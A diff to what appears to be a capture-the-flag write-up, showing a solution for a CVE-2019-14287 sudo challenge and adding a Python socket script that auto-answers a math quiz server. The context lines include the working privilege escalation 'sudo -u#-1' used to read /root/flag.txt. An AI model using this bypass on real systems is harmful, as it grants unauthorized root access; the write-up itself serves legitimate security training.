@@ -13,7 +13,7 @@
 1. This challenge based on CVE-2019-14287
     
     <aside>
-    💡 In Sudo before 1.8.28, an attacker with access to run as ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.
+    > 💡 In Sudo before 1.8.28, an attacker with access to run as ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.
     
     </aside>
     
@@ -21,7 +21,7 @@
 3. Now we can do sudo -l
     
     <aside>
-    💡 sudo -l command is used to list the commands that a user is allowed to run using 'sudo
+    > 💡 sudo -l command is used to list the commands that a user is allowed to run using 'sudo
     </aside>
 
 
@@ -52,4 +52,94 @@ Y2gzZH0K
 ```bash
 ctf-player@d86f88d61095:~$ sudo -u#-1 base64 /root/flag.txt | base64 -d                                
 Easy huh? Here the flag : ICE{th@nkfu11y_th1s_CVE_are_p@tch3d}
+```
+
+
+## Math Genius
+
+```python
+import socket
+
+def solve_question(question):
+    try:
+        # Split the question to extract numbers and operator
+        parts = question.strip().split(' ')
+        num1 = float(parts[4])
+        operator = parts[5]
+        num2 = float(parts[6].rstrip('?'))
+
+        # Calculate based on the operator
+        if operator == '+':
+            return num1 + num2
+        elif operator == '-':
+            return num1 - num2
+        elif operator == '*':
+            return num1 * num2
+        elif operator == '/':
+            return num1 / num2
+        else:
+            print(f"Unknown operator: {operator}")
+            return None
+
+    except (IndexError, ValueError) as e:
+        print(f"Error parsing question: {question}")
+        print(e)
+        return None
+
+def main():
+    host = 'ice-training.syamilyusof.com'
+    port = 30788
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((host, port))
+            welcome_message = s.recv(1024).decode().strip()
+            print(welcome_message)  # Welcome message
+
+            s.sendall(b'y\n')
+            start_message = s.recv(1024).decode().strip()
+            print(start_message)  # Confirmation message
+
+            for i in range(100):
+                try:
+                    data = s.recv(1024).decode().strip()
+                    print(data)  # Print all received data for debugging
+
+                    # Split data to handle multiple lines
+                    lines = data.split('\n')
+
+                    for line in lines:
+                        if "Question" in line:
+                            question = line.strip()
+                            print(question)  # Print question for debugging
+                            answer = solve_question(question)
+                            if answer is not None:
+                                s.sendall(f"{answer}\n".encode())
+                                response = s.recv(1024).decode().strip()
+                                if "Correct" in response:
+                                    print("Correct answer received.")
+                                else:
+                                    print("Unexpected message from server:")
+                                    print(response)
+                                    return
+                            else:
+                                print("Failed to parse the question.")
+                                return
+                        elif "Great! Answer 100 questions correctly to win." in line:
+                            continue  # Skip this line, as it's not part of the question
+                        elif line.strip() == "":
+                            continue  # Skip empty lines
+                        else:
+                            print("Unexpected message from server:")
+                            print(line)
+                            return
+                except Exception as e:
+                    print(f"An error occurred: {e}")
+                    return
+
+        except Exception as e:
+            print(f"Connection error: {e}")
+
+if __name__ == "__main__":
+    main()
 ```
